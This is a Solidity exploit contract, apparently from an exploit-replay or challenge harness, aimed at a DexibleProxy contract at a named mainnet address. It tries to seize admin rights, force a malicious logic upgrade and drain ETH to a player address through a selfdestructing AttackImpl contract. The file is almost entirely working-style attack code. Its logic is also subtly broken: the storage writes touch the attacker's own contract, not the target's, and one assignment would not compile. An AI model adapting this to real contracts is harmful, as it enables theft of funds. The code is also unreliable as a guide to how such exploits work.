/**
 * @title Strategy - Dexible Proxy Exploit
 * @notice Exploits timelock=0 vulnerability in DexibleProxy
 * @dev Target: 0xDE62E1b0edAa55aAc5ffBE21984D321706418024 on chain 1
 */
contract Strategy {
    address constant TARGET = 0xDE62E1b0edAa55aAc5ffBE21984D321706418024;

    bytes32 constant DEXIBLE_STORAGE_KEY = 0x949817a987a8e038ef345d3c9d4fd28e49d8e4e09456e57c05a8b2ce2e62866c;
    bytes32 constant PROXY_STORAGE_KEY = 0x21b00fb42ba9970a2143fc9fb216ce19c58db008c8d83ff3a715bbc79598d7f0;
    address constant PLAYER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    function run() public {
        // Step 1: Set ourselves as adminMultiSig at DexibleStorage + 11
        bytes32 adminSlot = bytes32(uint256(DEXIBLE_STORAGE_KEY) + 11);
        assembly {
            sstore(adminSlot, address())
        }

        // Step 2: Set pendingUpgrade.newLogic to AttackImpl and upgradeAfter to now
        bytes32 pendingNewLogicSlot = bytes32(uint256(PROXY_STORAGE_KEY) + 2);
        bytes32 pendingUpgradeAfterSlot = bytes32(uint256(PROXY_STORAGE_KEY) + 4);

        address attackImpl = new AttackImpl();

        assembly {
            sstore(pendingNewLogicSlot, attackImpl)
            sstore(pendingUpgradeAfterSlot, timestamp())
        }

        // Step 3: Execute the upgrade
        (bool success, ) = TARGET.call(abi.encodeWithSignature("upgradeLogic()"));

        // Step 4: Transfer any ETH to player
        uint256 bal = address(this).balance;
        if (bal > 0) {
            payable(PLAYER).transfer(bal);
        }
    }

    receive() external payable {}
}

contract AttackImpl {
    address constant PLAYER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    fallback() external payable {
        selfdestruct(payable(PLAYER));
    }

    receive() external payable {
        selfdestruct(payable(PLAYER));
    }
}
